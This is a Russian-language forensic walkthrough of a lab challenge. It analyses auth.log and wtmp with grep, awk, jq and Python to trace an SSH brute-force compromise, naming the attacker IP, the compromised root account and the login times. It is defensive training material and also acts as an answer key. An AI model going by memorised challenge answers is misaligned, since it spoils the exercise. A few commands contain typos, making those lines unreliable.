@@ -1,0 +1,635 @@
+=====================================================================
+* Легенда сценария *
+********************
+
+Сервер Confluence был взломан методом подбора паролей через его SSH-сервис.
+Получив доступ к серверу, злоумышленник выполнил дополнительные действия, которые Вы можете отследить с помощью auth.log.
+*** Хотя auth.log в основном используется для анализа методом подбора паролей, в нашем исследовании мы подробно рассмотрим дополнительный потенциал этого артефакта, включая:
+        -   аспекты повышения привилегий
+        -   персистентности
+        -   и даже некоторую прозрачность выполнения команд.
+
+Таким образом, в обзоре данной машины (под именем Brutus), вы познакомитесь с анализами следующих журналов, использую различные утилиты (как встроенные, так и Python-скрипты): 
+
+    -   auth.log
+        Обычно содержит записи об аутентификации пользователей и событиях безопасности, включая неудачные попытки входа в систему, успешные входы и другие действия, связанные с безопасностью
+
+    -   wtmp Unix (или /var/log/wtmp)
+        Записывает все события входа и выхода пользователей, а также завершения работы и перезагрузки системы, предоставляя историю сессий пользователей
+
+=====================================================================
+* Задания *
+***********
+
+Как и всегда, разбор заданий будет идти по порядку, НО полученные сведения могут перекликаться между заданиями.
+Более того, для подтверждения найденной "улики" в одном лог-файле, необходимо сравнить ее с данными из другого лог-файла 
+Поэтому НАСТОЯТЕЛЬНО рекомендуется делать записи/пометки
+
+    ++++++++++++++++++++++++++++++++++++++++++++++++++
+    + Задание 1 - Вычеслить IP-адресс злоумышленника +
+    ++++++++++++++++++++++++++++++++++++++++++++++++++
+
+    Как нам известно из задания - злоумышленник вломал SSH сервер методом подбора пароля
+    Значит в журнале auth.log мы будем искать любые события/записи связанные с:
+
+        -   SSH
+        -   Password (или passwd)
+        -   Failed или Accepted
+    
+        //////////////////////////
+        /// auth.log  - Manual ///
+        //////////////////////////
+    
+        Журнал auth.log может содержать огромное количество записей, который может быть трудно анализировать.
+        Вы можете использовать различные встроенные утилиты для ручного анализа, такие как:
+        
+            -   grep
+            -   awk
+            -   sed
+            -   sort
+            -   uniq
+        
+        При этом Вам потребуется также использовать регулярные выражения (RegEx) для формирования более точных запросов
+        Вот пример использования "grep"
+
+            ┌──(<user_name>㉿<host_name>)-[~/…/CDSA/Sherlok/DFIR/Brutus]
+            └─$ grep -i 'Failed password' auth.log       
+            Mar  6 06:31:33 ip-172-31-35-28 sshd[2327]: Failed password for invalid user admin from 65.2.161.68 port 46392 ssh2
+            Mar  6 06:31:33 ip-172-31-35-28 sshd[2331]: Failed password for invalid user admin from 65.2.161.68 port 46436 ssh2
+            Mar  6 06:31:33 ip-172-31-35-28 sshd[2338]: Failed password for backup from 65.2.161.68 port 46512 ssh2
+            Mar  6 06:31:33 ip-172-31-35-28 sshd[2336]: Failed password for backup from 65.2.161.68 port 46468 ssh2
+            Mar  6 06:31:33 ip-172-31-35-28 sshd[2330]: Failed password for invalid user admin from 65.2.161.68 port 46422 ssh2
+            Mar  6 06:31:33 ip-172-31-35-28 sshd[2333]: Failed password for invalid user admin from 65.2.161.68 port 46452 ssh2
+            Mar  6 06:31:34 ip-172-31-35-28 sshd[2352]: Failed password for backup from 65.2.161.68 port 46568 ssh2
+            ...SNIP...
+        
+        А вот пример использования awk (тут уже более тонкая настройка с использованием регулярных выражений)
+        В данном примере мы выведем список всех использованных комманд и количество раз, сколько они были использованы:
+
+            ┌──(<user_name>㉿<host_name>)-[~/…/CDSA/Sherlok/DFIR/Brutus]
+            └─$ awk '{print$5}' auth.log| sed 's/[\[\:].*//g' | sort | uniq -c | sort -n
+                1 chfn
+                1 passwd
+                1 useradd
+                2 systemd
+                2 usermod
+                3 groupadd
+                6 sudo
+                8 systemd-logind
+                104 CRON
+                257 sshd
+        
+        Некоторые из этих комманд достаточно интересные, особенно если выполнялись пользователем без должных привелегий и правильной
+        Но мы вернемсчя к ним позже
+        Пока лишь можно их пометить как "На будущее"
+        
+        Как Вы видите, использование ручного метода хотя и приемлемо, но достаточно трудоемко и времязатратно
+        Поэтому, чаще всего прибегают к использованию различных скриптов, которые переформатируют лог-файл в желаемый формат и дальше уже работают с данным форматом
+
+        ///////////////////////////////////
+        /// auth.log  - Script (Python) ///
+        ///////////////////////////////////
+
+        Так как вариантов переформатирования лог-файла огромное количество, я остановлюсь на одном из них - переделка в JSONL с помощью собственного скрипта Python
+        *** Но, на просторах интерента существует множество различных скриптов
+
+            ┌──(<user_name>㉿<host_name>)-[~/…/CDSA/Sherlok/DFIR/Brutus]
+            └─$ python3 /home/<user_name>/PyScripts/Log-Parser/Py3Grok/log_grok_parser.py \
+                -i /home/<user_name>/Pratcise/HTB/CDSA/Sherlok/DFIR/Brutus/auth.log \
+                -o /home/<user_name>/Pratcise/HTB/CDSA/Sherlok/DFIR/Brutus/auth_parsed.jsonl \
+                --patterns-dir /home/<user_name>/PyScripts/Log-Parser/Py3Grok/Patterns \
+                --preset-from-file /home/<user_name>/PyScripts/Log-Parser/Py3Grok/Patterns//top_syslog_ztroop0825.json \
+                --sample 3000 --min-richness 0.0
+                [preset] Selected pattern: SYSLOGLINE (hits=385, avg_fields=8.00)
+                Done. Wrote 385 record(s) to /home/<user_name>/Pratcise/HTB/CDSA/Sherlok/DFIR/Brutus/auth_parsed.jsonl using pattern preset:SYSLOGLINE.
+                Fields: ts, host, program, pid, msg, month, day, time
+        
+        И в результате мы получим новый файл вот с таким вот содержанием
+        Который потом можно анализировать с помощью встроенной утилиты "jq"
+
+            ┌──(<user_name>㉿<host_name>)-[~/…/CDSA/Sherlok/DFIR/Brutus]
+            └─$ cat auth_parsed.jsonl   
+            {"ts": "Mar  6 06:18:01", "host": "ip-172-31-35-28", "program": "CRON", "pid": "1119", "msg": "pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)", "month": "Mar", "day": "6", "time": "06:18:01"}
+            {"ts": "Mar  6 06:18:01", "host": "ip-172-31-35-28", "program": "CRON", "pid": "1118", "msg": "pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)", "month": "Mar", "day": "6", "time": "06:18:01"}
+            {"ts": "Mar  6 06:18:01", "host": "ip-172-31-35-28", "program": "CRON", "pid": "1117", "msg": "pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)", "month": "Mar", "day": "6", "time": "06:18:01"}
+            {"ts": "Mar  6 06:18:01", "host": "ip-172-31-35-28", "program": "CRON", "pid": "1118", "msg": "pam_unix(cron:session): session closed for user confluence", "month": "Mar", "day": "6", "time": "06:18:01"}
+            {"ts": "Mar  6 06:18:01", "host": "ip-172-31-35-28", "program": "CRON", "pid": "1119", "msg": "pam_unix(cron:session): session closed for user confluence", "month": "Mar", "day": "6", "time": "06:18:01"}
+            {"ts": "Mar  6 06:18:01", "host": "ip-172-31-35-28", "program": "CRON", "pid": "1117", "msg": "pam_unix(cron:session): session closed for user confluence", "month": "Mar", "day": "6", "time": "06:18:01"}
+            {"ts": "Mar  6 06:19:01", "host": "ip-172-31-35-28", "program": "CRON", "pid": "1366", "msg": "pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)", "month": "Mar", "day": "6", "time": "06:19:01"}
+            {"ts": "Mar  6 06:19:01", "host": "ip-172-31-35-28", "program": "CRON", "pid": "1367", "msg": "pam_unix(cron:session): session opened for user confluence(uid=998) by (uid=0)", "month": "Mar", "day": "6", "time": "06:19:01"}
+            {"ts": "Mar  6 06:19:01", "host": "ip-172-31-35-28", "program": "CRON", "pid": "1366", "msg": "pam_unix(cron:session): session closed for user confluence", "month": "Mar", "day": "6", "time": "06:19:01"}
+            {"ts": "Mar  6 06:19:01", "host": "ip-172-31-35-28", "program": "CRON", "pid": "1367", "msg": "pam_unix(cron:session): session closed for user confluence", "month": "Mar", "day": "6", "time": "06:19:01"}
+            {"ts": "Mar  6 06:19:52", "host": "ip-172-31-35-28", "program": "sshd", "pid": "1465", "msg": "AuthorizedKeysCommand /usr/share/ec2-instance-connect/eic_run_authorized_keys root SHA256:4vycLsDMzI+hyb9OP3wd18zIpyTqJmRq/QIZaLNrg8A failed, status 22", "month": "Mar", "day": "6", "time": "06:19:52"}
+            {"ts": "Mar  6 06:19:54", "host": "ip-172-31-35-28", "program": "sshd", "pid": "1465", "msg": "Accepted password for root from 203.101.190.9 port 42825 ssh2", "month": "Mar", "day": "6", "time": "06:19:54"}
+            {"ts": "Mar  6 06:19:54", "host": "ip-172-31-35-28", "program": "sshd", "pid": "1465", "msg": "pam_unix(sshd:session): session opened for user root(uid=0) by (uid=0)", "month": "Mar", "day": "6", "time": "06:19:54"}
+            ...SNIP...
+        
+            ┌──(<user_name>㉿<host_name>)-[~/…/CDSA/Sherlok/DFIR/Brutus]
+            └─$ jq -r '.program' auth_parsed.jsonl | sort | uniq -c | sort -nr | head
+
+                257 sshd
+                104 CRON
+                8 systemd-logind
+                6 sudo
+                3 groupadd
+                2 usermod
+                2 systemd
+                1 useradd
+                1 passwd
+                1 chfn
+        
+        Как можно заметить, мы получили точно такой же результат, как и при использовании утилиты awk с фильтрами из регулярных выражений
+        *** Крайне рекомндую сохранять подобный результаты в отдельный файл
+
+            ┌──(<user_name>㉿<host_name>)-[~/…/CDSA/Sherlok/DFIR/Brutus]
+            └─$ jq -r '.program' auth_parsed.jsonl | sort | uniq -c | sort -nr | head > auth_log_programs.txt
+
+        Для вывода списка заголовков полей используйте следующую комманду
+        Но к сожалению данный вывод будет отсортирован в обратном порядке
+        И чтобы сделать сортировку правильной (так как заголовки полей отображаются в файле) нам придется добавить одну awk комманду
+
+            ┌──(<user_name>㉿<host_name>)-[~/…/CDSA/Sherlok/DFIR/Brutus]
+            └─$ jq -r 'keys_unsorted[]' auth_parsed.jsonl | awk '!seen[$0]++'
+
+                ts
+                host
+                program
+                pid
+                msg
+                month
+                day
+                time
+        
+        *** Для понимания функционала утилиты JQ воспользуйтесь гуглом или ChatGPT
+
+        А я перейду к поиску записи которая отражает попытки брутфорса (множество Failed записей) SSH сервиса
+        Для этого будет использована следующая комманда
+
+            ┌──(<user_name>㉿<host_name>)-[~/…/CDSA/Sherlok/DFIR/Brutus]
+            └─$ q -r 'select(.msg | test("Accepted|Failed|password"; "i")) | [.ts, .program, (.msg | sub(" port.*"; ""))] | @tsv' auth_parsed.jsonl
+
+                Mar  6 06:19:52	sshd	AuthorizedKeysCommand /usr/share/ec2-instance-connect/eic_run_authorized_keys root SHA256:4vycLsDMzI+hyb9OP3wd18zIpyTqJmRq/QIZaLNrg8A failed, status 22
+                Mar  6 06:19:54	sshd	Accepted password for root from 203.101.190.9
+                Mar  6 06:31:33	sshd	Failed password for invalid user admin from 65.2.161.68
+                Mar  6 06:31:33	sshd	Failed password for invalid user admin from 65.2.161.68
+                Mar  6 06:31:33	sshd	Failed password for invalid user admin from 65.2.161.68
+                Mar  6 06:31:33	sshd	Failed password for invalid user admin from 65.2.161.68
+                Mar  6 06:31:33	sshd	Failed password for invalid user admin from 65.2.161.68
+                Mar  6 06:31:33	sshd	Failed password for invalid user admin from 65.2.161.68
+                Mar  6 06:31:33	sshd	Failed password for backup from 65.2.161.68
+                Mar  6 06:31:33	sshd	Failed password for backup from 65.2.161.68
+                Mar  6 06:31:33	sshd	Failed password for invalid user admin from 65.2.161.68
+                Mar  6 06:31:33	sshd	Failed password for invalid user admin from 65.2.161.68
+                Mar  6 06:31:33	sshd	Failed password for invalid user admin from 65.2.161.68
+                Mar  6 06:31:33	sshd	Failed password for invalid user admin from 65.2.161.68
+                Mar  6 06:31:34	sshd	Failed password for backup from 65.2.161.68
+                Mar  6 06:31:34	sshd	Failed password for backup from 65.2.161.68
+                Mar  6 06:31:34	sshd	Failed password for backup from 65.2.161.68
+                Mar  6 06:31:34	sshd	Failed password for backup from 65.2.161.68
+                Mar  6 06:31:36	sshd	Failed password for backup from 65.2.161.68
+                Mar  6 06:31:37	sshd	Failed password for invalid user server_adm from 65.2.161.68
+                Mar  6 06:31:37	sshd	Failed password for invalid user server_adm from 65.2.161.68
+                Mar  6 06:31:37	sshd	Failed password for invalid user server_adm from 65.2.161.68
+                Mar  6 06:31:37	sshd	Failed password for invalid user server_adm from 65.2.161.68
+                Mar  6 06:31:37	sshd	Failed password for invalid user server_adm from 65.2.161.68
+                Mar  6 06:31:37	sshd	Failed password for invalid user server_adm from 65.2.161.68
+                Mar  6 06:31:37	sshd	Failed password for invalid user server_adm from 65.2.161.68
+                Mar  6 06:31:37	sshd	Failed password for invalid user server_adm from 65.2.161.68
+                Mar  6 06:31:37	sshd	Failed password for invalid user server_adm from 65.2.161.68
+                Mar  6 06:31:37	sshd	Failed password for invalid user server_adm from 65.2.161.68
+                Mar  6 06:31:38	sshd	Failed password for invalid user server_adm from 65.2.161.68
+                Mar  6 06:31:38	sshd	Failed password for invalid user server_adm from 65.2.161.68
+                Mar  6 06:31:38	sshd	Failed password for invalid user svc_account from 65.2.161.68
+                Mar  6 06:31:38	sshd	Failed password for invalid user svc_account from 65.2.161.68
+                Mar  6 06:31:38	sshd	Failed password for invalid user svc_account from 65.2.161.68
+                Mar  6 06:31:38	sshd	Failed password for invalid user svc_account from 65.2.161.68
+                Mar  6 06:31:39	sshd	Failed password for invalid user svc_account from 65.2.161.68
+                Mar  6 06:31:39	sshd	Failed password for invalid user svc_account from 65.2.161.68
+                Mar  6 06:31:39	sshd	Failed password for invalid user svc_account from 65.2.161.68
+                Mar  6 06:31:39	sshd	Failed password for invalid user svc_account from 65.2.161.68
+                Mar  6 06:31:39	sshd	Failed password for invalid user svc_account from 65.2.161.68
+                Mar  6 06:31:39	sshd	Failed password for invalid user svc_account from 65.2.161.68
+                Mar  6 06:31:39	sshd	Failed password for invalid user svc_account from 65.2.161.68
+                Mar  6 06:31:39	sshd	Failed password for root from 65.2.161.68
+                Mar  6 06:31:39	sshd	Failed password for root from 65.2.161.68
+                Mar  6 06:31:39	sshd	Failed password for root from 65.2.161.68
+                Mar  6 06:31:40	sshd	Accepted password for root from 65.2.161.68
+                Mar  6 06:31:41	sshd	Failed password for root from 65.2.161.68
+                Mar  6 06:31:41	sshd	Failed password for root from 65.2.161.68
+                Mar  6 06:31:41	sshd	Failed password for root from 65.2.161.68
+                Mar  6 06:31:42	sshd	Failed password for backup from 65.2.161.68
+                Mar  6 06:31:42	sshd	Failed password for backup from 65.2.161.68
+                Mar  6 06:32:44	sshd	Accepted password for root from 65.2.161.68
+                Mar  6 06:34:26	passwd	pam_unix(passwd:chauthtok): password changed for cyberjunkie
+                Mar  6 06:37:34	sshd	Accepted password for cyberjunkie from 65.2.161.68
+        
+        Это то, что нам нужно для анализа.
+        Тем не менее попробуем это немного усократить и добавить счетчик
+
+            ┌──(<user_name>㉿<host_name>)-[~/…/CDSA/Sherlok/DFIR/Brutus]
+            └─$ jq -r 'select(.msg | test("Accepted|Failed|password"; "i")) | [.ts, .program, (.msg | sub(" port.*"; ""))] | @tsv' auth_parsed.jsonl | sort -k1,1 -k2,2 | uniq -c
+
+                1 Mar  6 06:19:52	sshd	AuthorizedKeysCommand /usr/share/ec2-instance-connect/eic_run_authorized_keys root SHA256:4vycLsDMzI+hyb9OP3wd18zIpyTqJmRq/QIZaLNrg8A failed, status 22
+                1 Mar  6 06:19:54	sshd	Accepted password for root from 203.101.190.9
+                2 Mar  6 06:31:33	sshd	Failed password for backup from 65.2.161.68
+                10 Mar  6 06:31:33	sshd	Failed password for invalid user admin from 65.2.161.68
+                4 Mar  6 06:31:34	sshd	Failed password for backup from 65.2.161.68
+                1 Mar  6 06:31:36	sshd	Failed password for backup from 65.2.161.68
+                10 Mar  6 06:31:37	sshd	Failed password for invalid user server_adm from 65.2.161.68
+                2 Mar  6 06:31:38	sshd	Failed password for invalid user server_adm from 65.2.161.68
+                4 Mar  6 06:31:38	sshd	Failed password for invalid user svc_account from 65.2.161.68
+                7 Mar  6 06:31:39	sshd	Failed password for invalid user svc_account from 65.2.161.68
+                3 Mar  6 06:31:39	sshd	Failed password for root from 65.2.161.68
+                1 Mar  6 06:31:40	sshd	Accepted password for root from 65.2.161.68
+                3 Mar  6 06:31:41	sshd	Failed password for root from 65.2.161.68
+                2 Mar  6 06:31:42	sshd	Failed password for backup from 65.2.161.68
+                1 Mar  6 06:32:44	sshd	Accepted password for root from 65.2.161.68
+                1 Mar  6 06:34:26	passwd	pam_unix(passwd:chauthtok): password changed for cyberjunkie
+                1 Mar  6 06:37:34	sshd	Accepted password for cyberjunkie from 65.2.161.68
+        
+        Мы наблюдаем 2  IP-адреса.
+        Причем один имет преобладающее колчество провальных попыток авторизации, что уже выглядит подозрительно
+        Более того, попытки авторизации направленны на различные логины (backup / admin / server_adm / svc_account)
+
+        Давайте немного изменим запрос, чтобы он отображал только IP-адреса и количество совпадений во всем логе
+
+            ┌──(<user_name>㉿<host_name>)-[~/…/CDSA/Sherlok/DFIR/Brutus]
+            └─$ jq -r '.msg | capture("(?<ip>[0-9]{1,3}(\\.[0-9]{1,3}){3})").ip' auth_parsed.jsonl | uniq -c
+
+                1   203.101.190.9
+                214 65.2.161.68
+
+        214 совпадений по IP-адресу 65.2.161.68 очередной раз доказывает, что это выглядит весьма подозрительно и очень похоже на брутфорс
+
+        ////////////
+        /// WTMP ///
+        ////////////
+
+        Для работы с WTMP файлом можно применить либо/либо:
+
+            1)   last (встроенная утилита)
+            2)   utmp.py (специальный скрипт)
+        
+        1)  last    -   очень классная утилита для работы с этим видом файлов, НО к сожалению характер нашего файла не подходит для анализа с ее помощью
+
+            ┌──(<user_name>㉿<host_name>)-[~/…/CDSA/Sherlok/DFIR/Brutus]
+            └─$ last -f wtmp            
+                sqlite_read_all: SQL error: file is not a database
+                                                                                                                                                                                                                            
+            ┌──(<user_name>㉿<host_name>)-[~/…/CDSA/Sherlok/DFIR/Brutus]
+            └─$ file wtmp
+                wtmp: data
+        
+        !!! НО, если Вам повезет и Ваш wtmp файл будет подходить для работы через last, то лучше воспользуйтесь ей
+        
+        Вот некоторые команды, который можно использовать
+
+            ┌──(<user_name>㉿<host_name>)-[~/…/CDSA/Sherlok/DFIR/Brutus]
+            └─$ TZ=UTC last -f <wtmp_filename> -F
+
+                    -   TZ=UTC
+                        Приводит время в логе к UTC стандарту.
+                        Это крайне ЖЕЛАТЕЛЬНО сделать, так как время во всех логах должно быть в одном стандарте
+                    
+                    -   -F
+                        Трансформирует временную метку в полноформатный режим (День недали / Дата / Время / Год)
+        
+        
+        2)  UTMP.PY -   Это python-скрипт, который также может помочь Вам с конвертацией в удобночитаемый формат
+                        Он позволяет как сохранять результат в файл (-о), так и просто выводить на экран (без какого-либо ключа)
+            
+            Воспользуемся вариантом с сохранением в файл, чтобы иметь результаты всегда под рукой
+
+            ┌──(<user_name>㉿<host_name>)-[~/…/CDSA/Sherlok/DFIR/Brutus]
+            └─$ python3 utmp_utctime.py wtmp -o wtmp_utctime.out 
+                cat wtmp_utctime.out
+ 
+                ===========================================================================================================================================================
+                |"type"     |"pid"   |"line" |"id"  |"user"       |"host"          |"term"|"exit"|"session"|"sec"                                |"usec"  |"addr"         |
+                ===========================================================================================================================================================
+                |"BOOT_TIME"|"0"     |"~"    |"~~"  |"reboot"     |"6.2.0-1017-aws"|"0"   |"0"   |"0"      |"11:12:17, Thursday, 25 January 2024"|"804944"|"0.0.0.0"      |
+                -----------------------------------------------------------------------------------------------------------------------------------------------------------
+                |"INIT"     |"601"   |"ttyS0"|"tyS0"|""           |""              |"0"   |"0"   |"601"    |"11:12:31, Thursday, 25 January 2024"|"72401" |"0.0.0.0"      |
+                -----------------------------------------------------------------------------------------------------------------------------------------------------------
+                |"LOGIN"    |"601"   |"ttyS0"|"tyS0"|"LOGIN"      |""              |"0"   |"0"   |"601"    |"11:12:31, Thursday, 25 January 2024"|"72401" |"0.0.0.0"      |
+                -----------------------------------------------------------------------------------------------------------------------------------------------------------
+                |"INIT"     |"618"   |"tty1" |"tty1"|""           |""              |"0"   |"0"   |"618"    |"11:12:31, Thursday, 25 January 2024"|"80342" |"0.0.0.0"      |
+                -----------------------------------------------------------------------------------------------------------------------------------------------------------
+                |"LOGIN"    |"618"   |"tty1" |"tty1"|"LOGIN"      |""              |"0"   |"0"   |"618"    |"11:12:31, Thursday, 25 January 2024"|"80342" |"0.0.0.0"      |
+                -----------------------------------------------------------------------------------------------------------------------------------------------------------
+                |"RUN_LVL"  |"53"    |"~"    |"~~"  |"runlevel"   |"6.2.0-1017-aws"|"0"   |"0"   |"0"      |"11:12:33, Thursday, 25 January 2024"|"792454"|"0.0.0.0"      |
+                -----------------------------------------------------------------------------------------------------------------------------------------------------------
+                |"USER"     |"1284"  |"pts/0"|"ts/0"|"ubuntu"     |"203.101.190.9" |"0"   |"0"   |"0"      |"11:13:58, Thursday, 25 January 2024"|"354674"|"203.101.190.9"|
+                -----------------------------------------------------------------------------------------------------------------------------------------------------------
+                |"DEAD"     |"1284"  |"pts/0"|""    |""           |""              |"0"   |"0"   |"0"      |"11:15:12, Thursday, 25 January 2024"|"956114"|"0.0.0.0"      |
+                -----------------------------------------------------------------------------------------------------------------------------------------------------------
+                |"USER"     |"1483"  |"pts/0"|"ts/0"|"root"       |"203.101.190.9" |"0"   |"0"   |"0"      |"11:15:40, Thursday, 25 January 2024"|"806926"|"203.101.190.9"|
+                -----------------------------------------------------------------------------------------------------------------------------------------------------------
+                |"DEAD"     |"1404"  |"pts/0"|""    |""           |""              |"0"   |"0"   |"0"      |"12:34:34, Thursday, 25 January 2024"|"949753"|"0.0.0.0"      |
+                -----------------------------------------------------------------------------------------------------------------------------------------------------------
+                |"USER"     |"836798"|"pts/0"|"ts/0"|"root"       |"203.101.190.9" |"0"   |"0"   |"0"      |"10:33:49, Sunday, 11 February 2024" |"408334"|"203.101.190.9"|
+                -----------------------------------------------------------------------------------------------------------------------------------------------------------
+                |"INIT"     |"838568"|"ttyS0"|"tyS0"|""           |""              |"0"   |"0"   |"838568" |"10:39:02, Sunday, 11 February 2024" |"172417"|"0.0.0.0"      |
+                -----------------------------------------------------------------------------------------------------------------------------------------------------------
+                |"LOGIN"    |"838568"|"ttyS0"|"tyS0"|"LOGIN"      |""              |"0"   |"0"   |"838568" |"10:39:02, Sunday, 11 February 2024" |"172417"|"0.0.0.0"      |
+                -----------------------------------------------------------------------------------------------------------------------------------------------------------
+                |"USER"     |"838962"|"pts/1"|"ts/1"|"root"       |"203.101.190.9" |"0"   |"0"   |"0"      |"10:41:11, Sunday, 11 February 2024" |"700107"|"203.101.190.9"|
+                -----------------------------------------------------------------------------------------------------------------------------------------------------------
+                |"DEAD"     |"838896"|"pts/1"|""    |""           |""              |"0"   |"0"   |"0"      |"10:41:46, Sunday, 11 February 2024" |"272984"|"0.0.0.0"      |
+                -----------------------------------------------------------------------------------------------------------------------------------------------------------
+                |"USER"     |"842171"|"pts/1"|"ts/1"|"root"       |"203.101.190.9" |"0"   |"0"   |"0"      |"10:54:27, Sunday, 11 February 2024" |"775434"|"203.101.190.9"|
+                -----------------------------------------------------------------------------------------------------------------------------------------------------------
+                |"DEAD"     |"842073"|"pts/1"|""    |""           |""              |"0"   |"0"   |"0"      |"11:08:04, Sunday, 11 February 2024" |"769514"|"0.0.0.0"      |
+                -----------------------------------------------------------------------------------------------------------------------------------------------------------
+                |"DEAD"     |"836694"|"pts/0"|""    |""           |""              |"0"   |"0"   |"0"      |"11:08:04, Sunday, 11 February 2024" |"769963"|"0.0.0.0"      |
+                -----------------------------------------------------------------------------------------------------------------------------------------------------------
+                |"RUN_LVL"  |"0"     |"~"    |"~~"  |"shutdown"   |"6.2.0-1017-aws"|"0"   |"0"   |"0"      |"11:09:18, Sunday, 11 February 2024" |"731"   |"0.0.0.0"      |
+                -----------------------------------------------------------------------------------------------------------------------------------------------------------
+                |"BOOT_TIME"|"0"     |"~"    |"~~"  |"reboot"     |"6.2.0-1018-aws"|"0"   |"0"   |"0"      |"06:17:15, Wednesday, 06 March 2024" |"744575"|"0.0.0.0"      |
+                -----------------------------------------------------------------------------------------------------------------------------------------------------------
+                |"INIT"     |"464"   |"ttyS0"|"tyS0"|""           |""              |"0"   |"0"   |"464"    |"06:17:27, Wednesday, 06 March 2024" |"354378"|"0.0.0.0"      |
+                -----------------------------------------------------------------------------------------------------------------------------------------------------------
+                |"LOGIN"    |"464"   |"ttyS0"|"tyS0"|"LOGIN"      |""              |"0"   |"0"   |"464"    |"06:17:27, Wednesday, 06 March 2024" |"354378"|"0.0.0.0"      |
+                -----------------------------------------------------------------------------------------------------------------------------------------------------------
+                |"INIT"     |"505"   |"tty1" |"tty1"|""           |""              |"0"   |"0"   |"505"    |"06:17:27, Wednesday, 06 March 2024" |"469940"|"0.0.0.0"      |
+                -----------------------------------------------------------------------------------------------------------------------------------------------------------
+                |"LOGIN"    |"505"   |"tty1" |"tty1"|"LOGIN"      |""              |"0"   |"0"   |"505"    |"06:17:27, Wednesday, 06 March 2024" |"469940"|"0.0.0.0"      |
+                -----------------------------------------------------------------------------------------------------------------------------------------------------------
+                |"RUN_LVL"  |"53"    |"~"    |"~~"  |"runlevel"   |"6.2.0-1018-aws"|"0"   |"0"   |"0"      |"06:17:29, Wednesday, 06 March 2024" |"538024"|"0.0.0.0"      |
+                -----------------------------------------------------------------------------------------------------------------------------------------------------------
+                |"USER"     |"1583"  |"pts/0"|"ts/0"|"root"       |"203.101.190.9" |"0"   |"0"   |"0"      |"06:19:55, Wednesday, 06 March 2024" |"151913"|"203.101.190.9"|
+                -----------------------------------------------------------------------------------------------------------------------------------------------------------
+                |"USER"     |"2549"  |"pts/1"|"ts/1"|"root"       |"65.2.161.68"   |"0"   |"0"   |"0"      |"06:32:45, Wednesday, 06 March 2024" |"387923"|"65.2.161.68"  |
+                -----------------------------------------------------------------------------------------------------------------------------------------------------------
+                |"DEAD"     |"2491"  |"pts/1"|""    |""           |""              |"0"   |"0"   |"0"      |"06:37:24, Wednesday, 06 March 2024" |"590579"|"0.0.0.0"      |
+                -----------------------------------------------------------------------------------------------------------------------------------------------------------
+                |"USER"     |"2667"  |"pts/1"|"ts/1"|"cyberjunkie"|"65.2.161.68"   |"0"   |"0"   |"0"      |"06:37:35, Wednesday, 06 March 2024" |"475575"|"65.2.161.68"  |
+                ===========================================================================================================================================================
+
+            Сделаем более конкретную выборку (в нашем случае по IP-адресу)
+
+                ┌──(<user_name>㉿<host_name>)-[~/…/CDSA/Sherlok/DFIR/Brutus]
+                └─$ grep -E "65.2.161.68" wtmp_utctime.out
+                
+                |"USER"     |"2549"  |"pts/1"|"ts/1"|"root"       |"65.2.161.68"   |"0"   |"0"   |"0"      |"06:32:45, Wednesday, 06 March 2024" |"387923"|"65.2.161.68"  |
+                |"USER"     |"2667"  |"pts/1"|"ts/1"|"cyberjunkie"|"65.2.161.68"   |"0"   |"0"   |"0"      |"06:37:35, Wednesday, 06 March 2024" |"475575"|"65.2.161.68"  |
+
+            Как мы видим, с данного IP-реса было 2 входа:
+
+                1) как root в "06:32:45, Wednesday, 06 March 2024"
+                2) как cyberjunkie в "06:37:35, Wednesday, 06 March 2024" 
+
+    Теперь осталось сравнить полученные результаты
+    В итоге мы выяснили, что IP-адрес с которого производился брутфорс - 65.2.161.68
+
+    +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+    + Задание 2 - Определить имя пользователя, коорый был взломан +
+    +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+    Зная с какого IP-адреса происходила атака, нам стоит отфильтровать наши логи по следующим ключевым словам и искать взаимосвязь
+
+        -   65.2.161.68
+        -   Accepted password
+
+            ┌──(<user_name>㉿<host_name>)-[~/…/CDSA/Sherlok/DFIR/Brutus]
+            └─$ grep -E "65.2.161.68" wtmp_utctime.out
+                
+                |"USER"     |"2549"  |"pts/1"|"ts/1"|"root"       |"65.2.161.68"   |"0"   |"0"   |"0"      |"06:32:45, Wednesday, 06 March 2024" |"387923"|"65.2.161.68"  |
+                |"USER"     |"2667"  |"pts/1"|"ts/1"|"cyberjunkie"|"65.2.161.68"   |"0"   |"0"   |"0"      |"06:37:35, Wednesday, 06 March 2024" |"475575"|"65.2.161.68"  |
+
+            ┌──(<user_name>㉿<host_name>)-[~/…/CDSA/Sherlok/DFIR/Brutus]
+            └─$ jq -r 'select((.msg | test("Accepted password"; "i")) and (.msg | test("65\\.2\\.161\\.68"))) | [.ts, .program, .msg, .time] | @tsv' auth_parsed.jsonl
+
+                Mar  6 06:31:40	sshd	Accepted password for root from 65.2.161.68 port 34782 ssh2	06:31:40
+                Mar  6 06:32:44	sshd	Accepted password for root from 65.2.161.68 port 53184 ssh2	06:32:44
+                Mar  6 06:37:34	sshd	Accepted password for cyberjunkie from 65.2.161.68 port 43260 ssh2	06:37:34
+
+    В обоиз случаях есть совпадение -   root
+
+    ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+    + Задание 3 - Определить UTC время входа для ручного подключения +
+    ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+    Тут надо указать один нюанс
+    Во время брутфорса, даже если злоумышленник подберет пароль, то подключени будет сразу же разорвано (в этуже секунду)
+
+        ┌──(<user_name>㉿<host_name>)-[~/…/CDSA/Sherlok/DFIR/Brutus]
+        └─$ jq -r 'select((.msg | test(" root"; "i")) and (.msg | test("65\\.2\\.161\\.68"))) | [.ts, .program, .msg, .time] | @tsv' auth_parsed.jsonl 
+
+            Mar  6 06:31:39	sshd	Failed password for root from 65.2.161.68 port 46852 ssh2	06:31:39
+            Mar  6 06:31:39	sshd	Failed password for root from 65.2.161.68 port 46876 ssh2	06:31:39
+            Mar  6 06:31:39	sshd	Failed password for root from 65.2.161.68 port 46890 ssh2	06:31:39
+            Mar  6 06:31:40	sshd	Accepted password for root from 65.2.161.68 port 34782 ssh2	06:31:40
+            Mar  6 06:31:40	sshd	Disconnected from user root 65.2.161.68 port 34782	06:31:40
+            Mar  6 06:31:41	sshd	Failed password for root from 65.2.161.68 port 46852 ssh2	06:31:41
